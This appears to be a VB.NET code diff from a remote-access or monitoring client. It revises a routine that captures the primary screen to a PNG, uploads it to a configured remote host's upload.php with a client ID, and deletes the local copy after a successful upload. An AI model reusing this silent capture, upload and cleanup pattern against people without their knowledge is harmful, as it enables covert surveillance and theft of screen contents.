@@ -12,9 +12,14 @@ Namespace Other
                 Form1.C.Log("Fail", "An unexpected error occurred" & ex.Message)
             End Try
         End Sub
-        Sub Upload(ByVal screenshot As String)
-            My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
-        End Sub
+        Private Function Upload(ByVal screenshot As String)
+            Try
+                My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
+                Return True
+            Catch ex As Exception
+                Return False
+            End Try
+        End Function
         Public Sub TakeScreen(ByVal filename As String)
             Try
                 Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
@@ -25,7 +30,9 @@ Namespace Other
                 graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
                 graphics.Flush()
                 image.Save(filename, ImageFormat.Png)
-                Upload(filename)
+                If Upload(filename) = True Then
+                    IO.File.Delete(filename)
+                End If
             Catch ex As Exception
 
             End Try
